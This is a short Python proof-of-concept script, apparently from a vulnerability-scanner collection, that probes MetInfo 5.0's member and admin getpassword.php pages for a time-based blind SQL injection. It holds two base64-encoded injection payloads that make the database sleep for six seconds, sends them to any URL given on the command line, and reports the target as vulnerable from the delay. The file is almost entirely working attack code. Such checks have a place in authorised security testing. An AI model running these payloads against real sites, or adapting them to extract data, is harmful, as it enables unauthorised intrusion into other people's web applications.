#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: metinfo5.0 getpassword.php两处时间盲注漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-021062
author: Lucifer
description: member/getpassword.php与admin/admin/getpassword.php文件中,经过base64解码后的值用explode打散后进入到
    SQL语句引起注入。
'''
import sys
import time
import requests
import warnings
from termcolor import cprint

class metinfo_getpassword_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = [r"/member/getpassword.php?lang=cn&p=MSdvcihzZWxlY3Qgc2xlZXAoNikpIy4x",
                    r"/admin/admin/getpassword.php?lang=cn&p=MSdvcihzZWxlY3Qgc2xlZXAoNikpIy4x"]

        for payload in payloads:
            vulnurl = self.url + payload
            start_time = time.time()

            try:
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if time.time() - start_time >= 6:
                    cprint("[+]存在metinfo SQL盲注漏洞...(高危)\tpayload: "+vulnurl, "red")

            except:
                cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = metinfo_getpassword_sqli_BaseVerify(sys.argv[1])
    testVuln.run()